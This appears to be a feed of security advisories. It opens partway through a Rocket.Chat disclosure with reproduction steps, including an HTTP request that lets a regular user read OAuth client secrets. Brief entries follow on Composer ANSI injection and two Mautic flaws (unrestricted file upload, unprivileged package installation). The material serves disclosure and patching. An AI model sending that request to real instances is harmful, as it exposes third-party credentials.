1. Log in as a regular (non-admin) user. 2. Obtain your `X-Auth-Token` and `X-User-Id`. 3. Send the following HTTP request:
``` GET /api/v1/oauth-apps.get?AppId=zapier X-Auth-Token: <user_token> X-User-Id: <user_id> ```
#### Example Response: ![image](https://github.com/user-attachments/assets/c9c7edd0-d3f3-4ef8-b791-eb081450f174)
The response contains internal configuration details of OAuth apps set up in the instance, including credentials that should only be accessible by admins.
### Vulnerable File and Code Location **Affected File:** `apps/meteor/app/api/server/v1/oauthapps.ts`
**Relevant Code Block (lines 25–45):** ![image](https://github.com/user-attachments/assets/cb56ae69-0228-4a78-a0f0-dde38f3b2b67)
**Issue:** The code above requires the user to be authenticated (`authRequired: true`) but does **not** perform any authorization or permission checks such as `hasPermissionAsync()`. As a result, **any authenticated user**, regardless of role, can access this endpoint and retrieve sensitive configuration data.
### Additional Information Affected Versions: Rocket.Chat ≤ 6.12.0
### Impact Disclosure of `client_id` and `client_secret` could lead to further compromise of third-party integrated services.
Violation of the principle of least privilege: users without administrative roles gain access to configuration data they are not authorized to see.
Potential compliance issues depending on how OAuth integrations are used (e.g., exposing keys to cloud identity providers).

item.title: [LOW] composer/composer – ANSI sequence injection
item.description:
### Impact Attackers controlling remote sources that Composer downloads from might in some way inject ANSI control characters in the terminal output of various Composer commands, causing mangled output and potentially leading to confusion or DoS of the terminal application.
There is no proven exploit and this has thus a low severity but we still publish a CVE as it has potential for abuse, and we want to be on the safe side informing users that they should upgrade.
### Patches 2.2.26 for 2.2 LTS or 2.9.3 for mainline

item.title: [HIGH] mautic/mautic – GrapesJsBuilder File Upload allows all file uploads

Arbitrary files can be uploaded via the GrapesJS Builder, as the types of files that can be uploaded are not restricted.
### Impact
If the media folder is not restricted from running files this can lead to a remote code execution.

item.title: [CRITICAL] mautic/mautic – Mautic user without privileged access to the Marketplace can install and uninstall composer packages
item.description:
### Summary
A non privileged user can install and remove arbitrary packages via composer for a composer based installed, even if the flag in update settings for enable composer based update is unticked.
### Impact
A low-privileged user of the platform can install malicious code to obtain higher privileges.
